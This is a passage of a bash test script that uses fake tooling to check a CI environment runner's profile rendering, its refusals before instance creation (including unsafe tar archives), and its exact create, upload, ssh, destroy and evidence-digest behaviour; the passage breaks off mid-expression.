[[ ! -s $profile_renderer_log ]] || fail 'a hosted preview identity reached the executable renderer'
for local_profile in lapras ditto rotom absol; do
  expect_refusal_message ProfileRenderInterfaceUnavailable \
    'Garden ratifies no runtime-free executable render command' \
    render_profile_case "$local_profile"
done
expect_refusal_message InputContractInvalid 'unknown profile porygon' \
  render_profile_case porygon
expect_refusal_message InputContractInvalid 'unknown profile ' render_profile_case ''

: >"$profile_renderer_log"
for local_profile in lapras ditto rotom absol; do
  render_profile_out=$scratch/profile-render-$local_profile.json
  render_profile_case "$local_profile" "$profile_renderer" >"$render_profile_out"
  jq -e --arg profile "$local_profile" \
    '.profile == $profile and .substrate == "k3d"' "$render_profile_out" >/dev/null ||
    fail "--render-profile did not pass through the $local_profile renderer result"
done
[[ $(<"$profile_renderer_log") == $'lapras\nditto\nrotom\nabsol' ]] ||
  fail '--render-profile invoked the executable renderer with a wrong selector or order'
ok 'all hosted, local, retired, and empty render-profile selectors have stable behavior'

: >"$profile_renderer_log"
export FAKE_RENDER_SUBSTRATE=entei-vcluster
expect_refusal_message ProfileRenderMismatch 'lapras did not render the local k3d contract' \
  run_profile_contract "$work/.diene/ci/environment-lock.v1.json" \
  "$scratch/profile-render-mismatch.json" "$profile_renderer"
unset FAKE_RENDER_SUBSTRATE
[[ ! -e $scratch/profile-render-mismatch.json ]] ||
  fail 'a mismatched executable render published a profile report'
[[ $(<"$profile_renderer_log") == lapras ]] ||
  fail 'render mismatch did not stop at the first local profile'

: >"$profile_renderer_log"
export FAKE_RENDER_FAIL_PROFILE=rotom
expect_refusal_message ProfileRenderInterfaceUnavailable 'rotom executable renderer failed' \
  run_profile_contract "$work/.diene/ci/environment-lock.v1.json" \
  "$scratch/profile-render-failed.json" "$profile_renderer"
unset FAKE_RENDER_FAIL_PROFILE
[[ ! -e $scratch/profile-render-failed.json ]] ||
  fail 'a failing executable renderer published a profile report'
[[ $(<"$profile_renderer_log") == $'lapras\nditto\nrotom' ]] ||
  fail 'a failing executable renderer did not stop at the failing profile'

profile_missing_renderer=$scratch/profile-missing-renderer
expect_refusal_message ProfileRenderInterfaceUnavailable \
  'configured profile renderer is absent or not executable' run_profile_contract \
  "$work/.diene/ci/environment-lock.v1.json" "$scratch/profile-render-missing.json" \
  "$profile_missing_renderer"
[[ ! -e $scratch/profile-render-missing.json ]] ||
  fail 'a missing configured renderer published a profile report'
ok 'mismatched, failing, and missing configured renderers refuse exactly without a report'

: >"$profile_renderer_log"
: >"$profile_pls_log"
: >"$profile_pls_accepted_log"
: >"$profile_output"
profile_rendered=$scratch/profile-rendered.json
run_profile_contract "$work/.diene/ci/environment-lock.v1.json" "$profile_rendered" "$profile_renderer"
jq -e '
  .outcome == "Pass" and .reasonCode == "ContractSatisfied" and
  .renderedProfiles == ["lapras","ditto","rotom","absol"] and
  .localExecutableRender == {outcome:"Pass",reasonCode:"ContractSatisfied"} and
  .castformExecutable.outcome == "Unavailable" and .eeveeExecutable.outcome == "Unavailable"
' "$profile_rendered" >/dev/null || fail 'the controlled renderer report did not bind the four local profiles'
"$profile_validator" --base-uri "file://$work/schemas/ci/" \
  --schemafile "$work/schemas/ci/diene-profile-report-v1.schema.json" "$profile_rendered" >/dev/null ||
  fail 'the controlled renderer report is not schema-valid'
jq -e '
  (keys_unsorted | sort) == [
    "apiVersion","castformExecutable","eeveeExecutable","localExecutableRender",
    "outcome","previewManifest","reasonCode","renderedProfiles","repositoryRevision",
    "staticContract","toolingDigests","validatedProfiles"
  ] and
  .validatedProfiles == ["eevee","castform"] and
  (.renderedProfiles | all(. != "eevee" and . != "castform")) and
  .castformExecutable == {outcome:"Unavailable",reasonCode:"PreviewIdentityUnavailable"} and
  .eeveeExecutable == {outcome:"Unavailable",reasonCode:"PreviewIdentityUnavailable"} and
  (has("rejectedAliases") | not)
' "$profile_rendered" >/dev/null ||
  fail 'the profile report invented a field or claimed a hosted preview render'
profile_lock_digest="sha256:$(sha256sum "$work/.diene/ci/environment-lock.v1.json" | awk '{print $1}')"
jq -e --arg sha "$SOURCE_SHA" --arg lockDigest "$profile_lock_digest" '
  .repositoryRevision == $sha and
  .toolingDigests == {environmentLockDigest:$lockDigest} and
  .previewManifest == {
    schemaVersion:"preview-manifest/v1",
    schemaDigest:"sha256:3333333333333333333333333333333333333333333333333333333333333333",
    wordListVersion:"v1"
  }
' "$profile_rendered" >/dev/null ||
  fail 'the profile report did not bind the exact revision, lock digest, and imported manifest entry'
[[ $(<"$profile_renderer_log") == $'lapras\nditto\nrotom\nabsol' ]] ||
  fail 'the renderer was called with something other than the exact four local profiles'
grep -Fxq "profile_report=$profile_rendered" "$profile_output" ||
  fail 'the controlled profile report path was not published through GITHUB_OUTPUT'
profile_report_digest="sha256:$(sha256sum "$profile_rendered" | awk '{print $1}')"
grep -Fxq "profile_report_digest=$profile_report_digest" "$profile_output" ||
  fail 'the controlled profile report digest was not published exactly'
[[ $(stat -c '%a' "$profile_rendered") == 600 ]] ||
  fail 'the controlled profile report is not mode 0600'
profile_temp_leftover=$(find "$scratch/profile-temp" -mindepth 1 -print -quit)
[[ -z $profile_temp_leftover ]] ||
  fail "profile contract left a scratch-scoped temporary object: $profile_temp_leftover"
ok 'controlled local renders pass while hosted previews and unratified roster/pin evidence remain Unavailable'

printf '== every cheap refusal precedes nsc create ==\n'

prepare_run 3001
export DIENE_TRUSTED_RUNTIME_CONTEXT=untrusted-pull-request
expect_precreate_refusal UntrustedSubject ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3002
export DIENE_NSC_DURATION=45m
expect_precreate_refusal InputContractInvalid ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3003
export DIENE_NAMESPACE_INGRESS=generated.namespace.example
expect_precreate_refusal InputContractInvalid ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3004 absol
export DIENE_NSC_CACHE_TAG=shared-cache
expect_precreate_refusal InputContractInvalid ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3005 fleet-independence
export DIENE_SEED_IDENTITY=forbidden-seed
expect_precreate_refusal InputContractInvalid ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3006
export DIENE_LANE=unknown-lane
expect_precreate_refusal InputContractInvalid ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3007
export DIENE_JOURNEY_MANIFEST=.diene/ci/other-journeys.yaml
expect_precreate_refusal InputContractInvalid ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3008 ditto-vendor
export DIENE_JOURNEY_MANIFEST=.diene/ci/journeys.v1.yaml
expect_precreate_refusal InputContractInvalid ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3009 ditto-target-pull
unset DIENE_ARTIFACT_PROVENANCE_REF
expect_precreate_refusal InputContractInvalid ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3010 ditto-target-pull
export DIENE_ARTIFACT_ATTESTATION_DIGEST=$CLOSURE_DIGEST
expect_precreate_refusal UntrustedSubject ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3011 ditto-target-pull
export DIENE_CONNECTED_EGRESS_JSON='[{"dns":"api.example.test","sni":"api.example.test","port":443,"methods":["GET"]}]'
expect_precreate_refusal ConnectedEgressInterfaceUnavailable ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3012 absol
export DIENE_CLOSURE_DIGEST=$ATTESTATION_DIGEST
expect_precreate_refusal UntrustedSubject ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3013 absol
unset DIENE_CLOSURE_SIGNATURE_BUNDLE_DIGEST
expect_precreate_refusal InputContractInvalid ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3014
write_subject "$DIENE_ARTIFACT_SUBJECT" 999999 1
expect_precreate_refusal UntrustedSubject ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3015
chmod 0644 "$work/.diene/ci/artifact-producer.sh"
expect_precreate_refusal ArtifactProducerUnavailable ./scripts/ci/environment-k3d-run.sh orchestrate
chmod 0755 "$work/.diene/ci/artifact-producer.sh"

prepare_run 3016
export DIENE_PRE_SIT_NEGATIVE_CANARY=1
expect_precreate_refusal ProductionFixtureInvalid ./scripts/ci/environment-k3d-run.sh orchestrate
unset DIENE_PRE_SIT_NEGATIVE_CANARY

fixture_backup=$scratch/demo-manifest.backup
cp "$work/.diene/ci/fixtures/demo/manifest.yaml" "$fixture_backup"
prepare_run 3017
printf '%s\n' '{"apiVersion":"diene.atomi.cloud/ci-fixture/v1","id":"demo","duration":"sixty-minutes"}' \
  >"$work/.diene/ci/fixtures/demo/manifest.yaml"
expect_precreate_refusal ProductionFixtureInvalid ./scripts/ci/environment-k3d-run.sh orchestrate
cp "$fixture_backup" "$work/.diene/ci/fixtures/demo/manifest.yaml"

prepare_run 3018
printf '%s\n' '{"apiVersion":"diene.atomi.cloud/ci-fixture/v1","id":"demo","duration":"60m"}' \
  >"$work/.diene/ci/fixtures/demo/manifest.yaml"
expect_precreate_refusal ProductionFixtureInvalid ./scripts/ci/environment-k3d-run.sh orchestrate
cp "$fixture_backup" "$work/.diene/ci/fixtures/demo/manifest.yaml"

prepare_run 3019 ditto-vendor
export DIENE_VENDOR_CREDENTIAL_BROKER_BIN=''
expect_precreate_refusal VendorBrokerInterfaceUnavailable ./scripts/ci/environment-k3d-run.sh orchestrate

prepare_run 3020
export DIENE_EGRESS_L7_ENFORCER_BIN=/tmp/untrusted-l7-enforcer
expect_precreate_refusal ConnectedEgressInterfaceUnavailable ./scripts/ci/environment-k3d-run.sh orchestrate

vendor_backup=$scratch/vendors.backup
cp "$work/.diene/ci/vendors.v1.yaml" "$vendor_backup"
prepare_run 3021 ditto-vendor
jq '.actions[0].componentClass = "K10" | .actions[0].permissionRule = "off"' \
  "$vendor_backup" >"$work/.diene/ci/vendors.v1.yaml"
expect_precreate_refusal SchemaValidationFailed ./scripts/ci/environment-k3d-run.sh orchestrate
cp "$vendor_backup" "$work/.diene/ci/vendors.v1.yaml"

journeys_backup=$scratch/journeys.backup
cp "$work/.diene/ci/journeys.v1.yaml" "$journeys_backup"
jq '
  .journeys |= map(if .id == "core-demo" then
    .appliesTo = [{lane:"absol",profile:"absol",buildMode:"build-local"}]
  else . end)
' "$journeys_backup" >"$work/.diene/ci/journeys.v1.yaml"
prepare_run 3022 ditto-build-local
expect_precreate_refusal JourneySelectorUnsatisfied ./scripts/ci/environment-k3d-run.sh orchestrate

jq '
  .journeys |= map(if .id == "core-demo" then
    .appliesTo = [{lane:"ditto-build-local",profile:"ditto",buildMode:"build-local"}]
  else . end)
' "$journeys_backup" >"$work/.diene/ci/journeys.v1.yaml"
prepare_run 3023 ditto-target-pull
expect_precreate_refusal JourneySelectorUnsatisfied ./scripts/ci/environment-k3d-run.sh orchestrate

jq '.journeys |= map(select(.id != "fleet-demo"))' \
  "$journeys_backup" >"$work/.diene/ci/journeys.v1.yaml"
prepare_run 3024 fleet-independence
expect_precreate_refusal JourneySelectorUnsatisfied ./scripts/ci/environment-k3d-run.sh orchestrate
cp "$journeys_backup" "$work/.diene/ci/journeys.v1.yaml"

validate_prerequisites_case() (
  cd -- "$work"
  ./scripts/ci/environment-profile-contract.sh --validate-prerequisites
)
prerequisite_run=3030
for lane in ditto-build-local ditto-target-pull absol fleet-independence; do
  prepare_run "$prerequisite_run" "$lane"
  validate_prerequisites_case >"$scratch/prerequisites-$lane.out" \
    2>"$scratch/prerequisites-$lane.err" || {
    sed -n '1,120p' "$scratch/prerequisites-$lane.err" >&2
    fail "the exact $lane four-tuple did not pass the pre-create selector"
  }
  assert_contains "$scratch/prerequisites-$lane.out" PreSitContractAccepted
  prerequisite_run=$((prerequisite_run + 1))
done
jq -e '
  (.properties.outcome.enum | sort) == ["Fail","NotApplicable","Pass","Unavailable"] and
  (.["$defs"].check.properties.outcome.enum | sort) == ["Fail","NotApplicable","Pass","Unavailable"]
' "$work/schemas/ci/diene-profile-report-v1.schema.json" >/dev/null ||
  fail 'the profile result vocabulary widened beyond Pass|Fail|NotApplicable|Unavailable'
jq -e '
  (.["$defs"].outcome.properties.outcome.enum | sort) == ["Fail","NotApplicable","Pass","Unavailable"]
' "$work/schemas/ci/diene-environment-report-v1.schema.json" >/dev/null ||
  fail 'the journey result vocabulary widened beyond Pass|Fail|NotApplicable|Unavailable'
ok 'exact four-tuples pass while another-lane, target/build-local, and fleet-isolation mismatches refuse before create'
ok 'trust, selectors, closure, vendor, producer, and fixture defects all stop before create'

printf '== exact Namespace CLI identity refuses version drift before create ==\n'

prepare_run 3050
exact_nsc_identity=$(
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  diene_nsc_identity
)
jq -e --arg binary "$fake_nsc_binary_digest" '
  .version == "v0.0.532" and
  .artifactDigest == "sha256:6666666666666666666666666666666666666666666666666666666666666666" and
  .binaryDigest == $binary
' <<<"$exact_nsc_identity" >/dev/null || fail 'the exact fake nsc identity did not validate as an object'
ok 'exact v0.0.532 version, release artifact, and executable digest are accepted'

for nsc_drift in older newer; do
  prepare_run "$([[ $nsc_drift == older ]] && printf 3051 || printf 3052)"
  expect_precreate_refusal NamespaceLifecycleUnavailable env \
    FAKE_NSC_SCENARIO="nsc-$nsc_drift" ./scripts/ci/environment-k3d-run.sh orchestrate
done
bad_nsc_identity=$scratch/bad-nsc-identity.json
jq '.binaryDigest = "sha256:9999999999999999999999999999999999999999999999999999999999999999"' \
  "$fake_nsc_identity" >"$bad_nsc_identity"
prepare_run 3053
expect_precreate_refusal NamespaceLifecycleUnavailable env \
  DIENE_NSC_IDENTITY_FILE="$bad_nsc_identity" ./scripts/ci/environment-k3d-run.sh orchestrate
ok 'older, newer, and executable-identity drift all refuse before nsc create'

printf '== hostile source archives refuse before create ==\n'

unicode_listing=$scratch/canonical-unicode.list
LC_ALL=C tar --list --quoting-style=escape --file "$source_archive" >"$unicode_listing"
grep -F -- '\342\232\241reusable-environment-k3d.yaml' "$unicode_listing" >/dev/null ||
  fail 'the source fixture did not exercise the canonical UTF-8 workflow name'
(
  # shellcheck source=/dev/null
  source "$work/scripts/ci/environment-lib.sh"
  diene_require_archive_members "$source_archive" \
    scripts/ci/environment-k3d-run.sh schemas/ci/diene-environment-report-v1.schema.json
) || fail 'a canonical archive containing the UTF-8 workflow name was rejected'
ok 'canonical UTF-8 git-archive names remain accepted'

hostile_run=3060
for hostile_kind in traversal absolute symlink hardlink fifo device; do
  prepare_run "$hostile_run"
  expect_precreate_refusal UntrustedSubject env \
    DIENE_SOURCE_ARCHIVE="$hostile_archive_dir/$hostile_kind.tar" \
    ./scripts/ci/environment-k3d-run.sh orchestrate
  hostile_run=$((hostile_run + 1))
done
ok 'traversal, absolute, symlink, hardlink, FIFO, and device source archives all refuse before create'

printf '== exact measured Namespace happy path ==\n'

run_happy_lane() {
  local run_id=${1:?run id required} lane=${2:?lane required} scenario=${3:-happy}
  prepare_run "$run_id" "$lane"
  run_orchestrator "$scenario" >"$scratch/happy-$run_id.out" 2>"$scratch/happy-$run_id.err" || {
    sed -n '1,160p' "$scratch/happy-$run_id.err" >&2
    fail "$lane happy lifecycle failed"
  }
  LAST_REPORT=$DIENE_CORE_REPORT
  [[ $lane != ditto-vendor ]] || LAST_REPORT=$DIENE_VENDOR_REPORT
  [[ -s $LAST_REPORT && -s $DIENE_PROOF_BUNDLE ]] || fail "$lane produced no final report/proof"
  jq -e '
    .namespaceLifecycle.duration == "2h" and .namespaceLifecycle.ephemeral == true and
    .namespaceLifecycle.endpointUsed == false and .namespaceLifecycle.cacheAttached == false and
    .namespaceLifecycle.lateCleanupCanRewrite == false and
    ([.namespaceLifecycle.create,.namespaceLifecycle.transfer,.namespaceLifecycle.ssh,
      .namespaceLifecycle.collection,.namespaceLifecycle.destroy,.namespaceLifecycle.absence] |
      all(.outcome == "Pass")) and .checkpointChain.validated == true and
    .checkpointChain.finalCleanPass == true and .checkpointChain.resumedLegs == 0 and
    .evidence.egressCanary.platformStatus ==
      "platform per-instance policy pending (support ask #4)"
  ' "$LAST_REPORT" >/dev/null || fail "$lane final lifecycle evidence is not complete"
  LAST_CLUSTER=$(jq -er '.instance.clusterId' "$LAST_REPORT")
  LAST_LOG=$FAKE_NSC_LOG
  LAST_BUNDLE=$DIENE_PROOF_BUNDLE
}

run_happy_lane 4001 ditto-build-local
happy_core_report=$scratch/happy-core.json
happy_core_bundle=$scratch/happy-core-proof.tar
cp "$LAST_REPORT" "$happy_core_report"
cp "$LAST_BUNDLE" "$happy_core_bundle"
happy_cluster=$LAST_CLUSTER
happy_log=$LAST_LOG

grep -Eq '^create --ephemeral --duration 2h --enable=kubernetes:1\.33 --wait_kube_system .*--output_json_to .*--output json .*--purpose .*--unique_tag .*--label .*--label .*--label ' \
  "$happy_log" || fail 'fake nsc did not observe the exact stable create surface'
[[ $(grep -o -- '--enable=[^ ]*' "$happy_log" | wc -l) == 1 ]] ||
  fail 'create did not pass exactly one Kubernetes feature selector'
[[ $(grep -o -- '--enable=[^ ]*' "$happy_log") == '--enable=kubernetes:1.33' ]] ||
  fail 'the create feature selector was not the exact derived admitted minor'
jq -e '.kubernetes_feature == "kubernetes:1.33" and .labels["nsc.kubernetes"] == "1.33"' \
  "$FAKE_NSC_ROOT/instances/$happy_cluster/meta.json" >/dev/null ||
  fail 'create metadata did not retain the selected Kubernetes feature'
if grep -Eq -- '(^| )--bare( |$)|--k3s[-_]image|--image( |=)|--ingress|--endpoint' "$happy_log"; then
  fail 'create substituted a bare, replacement-image, ingress, or endpoint surface'
fi
expected_uploads=$scratch/expected-guest-nix-uploads
actual_uploads=$scratch/actual-guest-nix-uploads
printf '%s\n' \
  /run/diene-ci/archive-validator.sh \
  /run/diene-ci/archive-validator.sha256 \
  /run/diene-ci/artifact-subject.json \
  /run/diene-ci/egress-contract.json \
  /run/diene-ci/guest-nix-bootstrap.sh \
  /run/diene-ci/guest-nix-bootstrap.sha256 \
  /run/diene-ci/guest-nix-installer \
  /run/diene-ci/guest-nix-installer.sha256 \
  /run/diene-ci/inputs.json \
  /run/diene-ci/receipt.json \
  /run/diene-ci/source.tar \
  "${guest_toolchain_uploads[@]}" | LC_ALL=C sort >"$expected_uploads"
[[ $(wc -l <"$expected_uploads") == 31 ]] ||
  fail 'the expected immutable upload set is not exactly thirty-one paths'
awk '$1 == "instance" && $2 == "upload" {print $5}' "$happy_log" | LC_ALL=C sort >"$actual_uploads"
diff -u "$expected_uploads" "$actual_uploads" >/dev/null ||
  fail 'the immutable upload path set is not the exact eleven originals plus twenty pinned Wolfi package files'
[[ $(grep -Ec '^instance download ' "$happy_log") == 2 ]] || fail 'fixed proof download count is not exactly two'
grep -Eq "^ssh ${happy_cluster} -T -- " "$happy_log" || fail 'driver did not use exact-id noninteractive separated ssh'
[[ $(grep -Ec "^destroy --force ${happy_cluster} " "$happy_log") == 1 ]] ||
  fail 'cleanup did not issue exactly one exact-id force destroy'
grep -Eq '^list --all -o json ' "$happy_log" || fail 'positive absence did not query the complete list'
if grep -Eq '^destroy .*diene_|^destroy .*\*|^destroy .*--label|^(scp|cp|ingress|egress) ' "$happy_log"; then
  fail 'the Namespace adapter used a prefix, broad selector, invented copy verb, ingress, or tenant policy'
fi
[[ $(FAKE_NSC_SCENARIO=happy "$fake_nsc" list --all -o json) == null ]] ||
  fail 'the measured empty-list null result was not normalized as exact absence'
jq -e --arg binary "$fake_nsc_binary_digest" '
  .tooling.nscVersion == "v0.0.532" and
  .tooling.nscArtifactDigest ==
    "sha256:6666666666666666666666666666666666666666666666666666666666666666" and
  .tooling.nscBinaryDigest == $binary
' "$happy_core_report" >/dev/null || fail 'the final report lost exact immutable nsc identity evidence'
tar -xOf "$happy_core_bundle" ci-receipt.json >"$scratch/happy-receipt.json"
jq -e --arg binary "$fake_nsc_binary_digest" '
  .tooling.nscVersion == "v0.0.532" and
  .tooling.nscArtifactDigest ==
    "sha256:6666666666666666666666666666666666666666666666666666666666666666" and
  .tooling.nscBinaryDigest == $binary
' "$scratch/happy-receipt.json" >/dev/null || fail 'the exact receipt lost immutable nsc identity evidence'
ok 'create/cid agreement/upload/ssh/download/exact destroy/list absence use measured nsc syntax'

happy_instance_state="$FAKE_NSC_ROOT/instances/$happy_cluster/fs/run/diene-ci"
for guest_asset in guest-nix-bootstrap.sh guest-nix-bootstrap.sha256 \
  guest-nix-installer guest-nix-installer.sha256; do
  [[ -f $happy_instance_state/$guest_asset && ! -L $happy_instance_state/$guest_asset ]] ||
    fail "the verified guest Nix upload $guest_asset is absent"
  [[ $(stat -c %a -- "$happy_instance_state/$guest_asset") == 600 ]] ||
    fail "the verified guest Nix upload $guest_asset is not mode 0600"
done
(cd "$happy_instance_state" && sha256sum -c guest-nix-bootstrap.sha256 >/dev/null &&
  sha256sum -c guest-nix-installer.sha256 >/dev/null) ||
  fail 'the uploaded guest Nix assets do not match their exact sidecars'
grep -Fxq -- 'installer-argv install linux --no-confirm --init none' "$FAKE_GUEST_NIX_EVENT_LOG" ||
  fail 'the fake installer did not capture the exact measured install argv'
grep -Fxq -- nix-config-bound "$FAKE_GUEST_NIX_EVENT_LOG" ||
  fail 'the happy guest rail did not bind the freshly installed Nix configuration'
grep -Fxq -- nix-develop "$FAKE_GUEST_NIX_EVENT_LOG" ||
  fail 'the happy guest rail did not reach nix develop after its identity gates'
ok 'both private pinned assets and exact sidecars upload and re-verify before the measured installer argv'

for guest_toolchain_file in "${guest_toolchain_files[@]}"; do
  for guest_toolchain_asset in "$guest_toolchain_file" "$guest_toolchain_file.sha256"; do
    [[ -f $happy_instance_state/gnu/$guest_toolchain_asset &&
      ! -L $happy_instance_state/gnu/$guest_toolchain_asset ]] ||
      fail "the verified guest toolchain upload $guest_toolchain_asset is absent"
    [[ $(stat -c %a -- "$happy_instance_state/gnu/$guest_toolchain_asset") == 600 ]] ||
      fail "the verified guest toolchain upload $guest_toolchain_asset is not mode 0600"
  done
  (cd "$happy_instance_state/gnu" && sha256sum -c "$guest_toolchain_file.sha256" >/dev/null) ||
    fail "the uploaded $guest_toolchain_file does not match its exact sidecar"
done
[[ $(find "$happy_instance_state/gnu" -type f | wc -l) == 20 ]] ||
  fail 'the guest toolchain upload directory is not exactly the ten packages and ten sidecars'
grep -Fxq -- toolchain-verified "$FAKE_GUEST_NIX_EVENT_LOG" ||
  fail 'the happy guest rail did not verify the pinned toolchain closure before the guest Nix uploads'
[[ $(grep -nFx -- toolchain-verified "$FAKE_GUEST_NIX_EVENT_LOG" | head -1 | cut -d: -f1) -lt \
  $(grep -nFx -- uploads-verified "$FAKE_GUEST_NIX_EVENT_LOG" | head -1 | cut -d: -f1) ]] ||
  fail 'the pinned toolchain closure was verified after the guest Nix assets'
happy_curl_log=$RUNNER_TEMP/guest-nix-curl.log
[[ $(grep -Ec -- '--max-redirs 1 ' "$happy_curl_log") == 10 &&
  $(grep -Ec -- '--max-redirs 0 ' "$happy_curl_log") == 2 ]] ||
  fail 'the pinned acquisition did not keep guest Nix at zero redirects and the package class at one'
[[ $(grep -Ec -- 'apk.cgr.dev' "$happy_curl_log") == 10 ]] ||
  fail 'the ten pinned Wolfi packages were not each acquired exactly once'
ok 'ten pinned packages and ten sidecars upload, re-verify, and use the one admitted redirect budget'

happy_collected=$(find "$RUNNER_TEMP/diene-namespace" -path '*/collected/evidence' -type d -print -quit)
[[ -n $happy_collected ]] || fail 'the happy lifecycle retained no safely extracted evidence tree'
happy_identity=$happy_collected/guest-nix/identity.json
happy_environment=$happy_collected/guest-nix/environment.txt
happy_preflight=$happy_collected/preflight.json
[[ -f $happy_identity && ! -L $happy_identity && $(stat -c %a -- "$happy_identity") == 600 ]] ||
  fail 'the collected guest Nix identity receipt is not a regular mode-0600 file'
[[ -f $happy_environment && ! -L $happy_environment &&
  $(stat -c %a -- "$happy_environment") == 600 ]] ||
  fail 'the collected guest Nix environment evidence is not a regular mode-0600 file'
happy_identity_digest="sha256:$(sha256sum "$happy_identity" | awk '{print $1}')"
happy_environment_digest="sha256:$(sha256sum "$happy_environment" | awk '{print $1}')"
jq -e --arg digest "$happy_identity_digest" --arg environmentDigest "$happy_environment_digest" \
  --slurpfile identity "$happy_identity" '
  .guestNix.payloadDigestVerified == true and
  .guestNix.executionMode == "direct-pinned-binary" and
  .guestNix.installerVersion == "nix-installer 3.21.9" and
  .guestNix.nixVersion == "nix (Determinate Nix 3.21.9) 2.34.8" and
  .guestNix.argv == ["install","linux","--no-confirm","--init","none"] and
  .guestNix.environmentDigest == $environmentDigest and
  .guestNix.identityReceiptDigest == $digest and
  (.guestNix | del(.identityReceiptDigest)) == $identity[0]
' "$happy_preflight" >/dev/null ||
  fail 'the collected identity receipt and preflight object do not agree exactly'
happy_toolchain_identity=$happy_collected/gnu-toolchain/identity.json
[[ -f $happy_toolchain_identity && ! -L $happy_toolchain_identity &&
  $(stat -c %a -- "$happy_toolchain_identity") == 600 ]] ||
  fail 'the collected guest toolchain identity receipt is not a regular mode-0600 file'
happy_toolchain_contract_digest=$(
  # shellcheck source=/dev/null
  source "$template_root/scripts/ci/environment-lib.sh"
  diene_guest_toolchain_contract_digest
)
jq -e --arg digest "sha256:$(sha256sum "$happy_toolchain_identity" | awk '{print $1}')" \
  --arg contractDigest "$happy_toolchain_contract_digest" \
  --slurpfile identity "$happy_toolchain_identity" '
  .guestToolchain.executionMode == "offline-pinned-apk" and
  .guestToolchain.apkBinPath == "/usr/bin/apk" and
  .guestToolchain.tarImplementation == "busybox" and
  (.guestToolchain.packages | length) == 10 and
  (.guestToolchain.argv | .[0:4]) ==
    ["add","--no-progress","--no-network","--allow-untrusted"] and
  .guestToolchain.contractDigest == $contractDigest and
  .guestToolchain.identityReceiptDigest == $digest and
  (.guestToolchain | del(.identityReceiptDigest)) == $identity[0]
' "$happy_preflight" >/dev/null ||
  fail 'the collected toolchain identity receipt and preflight object do not agree exactly'
happy_preflight_digest="sha256:$(sha256sum "$happy_preflight" | awk '{print $1}')"
jq -e --arg digest "$happy_preflight_digest" '
  [.checkpoints[] | select(.id == "instance-preflight" and .evidenceDigest == $digest)] | length == 1
' "$happy_collected/checkpoint-chain.json" >/dev/null ||
  fail 'the checkpoint chain does not bind the preflight object containing the identity receipt digest'
ok 'mode-0600 guest Nix identity agrees with preflight and is transitively checkpoint-bound'
ok 'the collected guest toolchain contract, receipt, and preflight object are one checkpoint-bound chain'

happy_socket=$happy_collected/staging/orchestration/ss-observation.txt
[[ -f $happy_socket && ! -L $happy_socket && $(stat -c %a -- "$happy_socket") == 600 ]] ||
  fail 'the safely collected proof lost the regular mode-0600 raw socket observation'
happy_socket_digest="sha256:$(sha256sum "$happy_socket" | awk '{print $1}')"
jq -e --arg digest "$happy_socket_digest" '
  .orchestrationTupleSource == "kernel-ss" and
  .orchestrationObservationArtifact == "orchestration/ss-observation.txt" and
  .orchestrationObservationDigest == $digest
' "$happy_collected/policy.json" >/dev/null ||
  fail 'collected policy.json does not digest-bind the retained raw socket observation'
ok 'the safely extracted proof retains the raw socket artifact bound by collected policy.json'

uploaded_validator="$FAKE_NSC_ROOT/instances/$happy_cluster/fs/run/diene-ci/archive-validator.sh"
[[ -x $uploaded_validator ]] || fail 'the immutable remote archive validator was not uploaded'
for hostile_kind in traversal absolute symlink hardlink fifo device; do
  remote_extract=$scratch/remote-hostile-$hostile_kind
  if "$uploaded_validator" "$hostile_archive_dir/$hostile_kind.tar" "$remote_extract" \
    >"$remote_extract.out" 2>"$remote_extract.err"; then
    fail "the uploaded validator accepted a $hostile_kind source archive"
  fi
  assert_contains "$remote_extract.err" UntrustedSubject
  [[ ! -e $remote_extract && ! -L $remote_extract ]] ||
    fail "the uploaded validator extracted the $hostile_kind source archive before refusal"
done
ok 'the locally executed remote validator rejects every unsafe name and member type before extraction'

nsc_lines_before=$(wc -l <"$happy_log")
(cd -- "$work" && FAKE_NSC_SCENARIO=happy ./scripts/ci/environment-k3d-run.sh lifecycle "$happy_core_bundle") \
  >"$scratch/lifecycle.out" 2>"$scratch/lifecycle.err" || {
  sed -n '1,120p' "$scratch/lifecycle.err" >&2
  fail 'workflow-owned lifecycle verifier rejected the green proof'
}
[[ $(wc -l <"$happy_log") == "$nsc_lines_before" ]] ||
  fail 'the unprivileged lifecycle verifier invoked Namespace authority'
assert_contains "$scratch/lifecycle.out" 'NamespaceLifecycleVerified:'
ok 'workflow-owned lifecycle verification consumes proof without nsc authority'

verify_lifecycle_main_case() (
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-k3d-run.sh
  environment_k3d_main lifecycle "$happy_core_bundle"
  [[ -z $(trap -p RETURN) ]] || fail 'lifecycle main leaked a RETURN trap past local cleanup scope'
)
nsc_lines_before=$(wc -l <"$happy_log")
verify_lifecycle_main_case >"$scratch/lifecycle-main.out" 2>"$scratch/lifecycle-main.err" || {
  sed -n '1,160p' "$scratch/lifecycle-main.err" >&2
  fail 'the source-safe lifecycle main rejected the green proof or leaked its RETURN trap'
}
[[ $(wc -l <"$happy_log") == "$nsc_lines_before" ]] ||
  fail 'the source-safe lifecycle main invoked Namespace authority'
assert_contains "$scratch/lifecycle-main.out" 'NamespaceLifecycleVerified:'
ok 'source-safe lifecycle main clears its local RETURN trap after a successful proof'

lifecycle_extract=$scratch/lifecycle-extract
install -d -m 0700 "$lifecycle_extract"
tar -xf "$happy_core_bundle" -C "$lifecycle_extract"
jq -e --slurpfile lifecycle "$lifecycle_extract/namespace-lifecycle.json" '
  .namespace.clusterId == $lifecycle[0].clusterId and
  .namespace.create.outcome == "Pass" and .namespace.destroy.outcome == "Pass" and
  .namespace.absence.outcome == "Pass" and
  .namespace.create.receiptDigest == $lifecycle[0].create.receiptDigest and
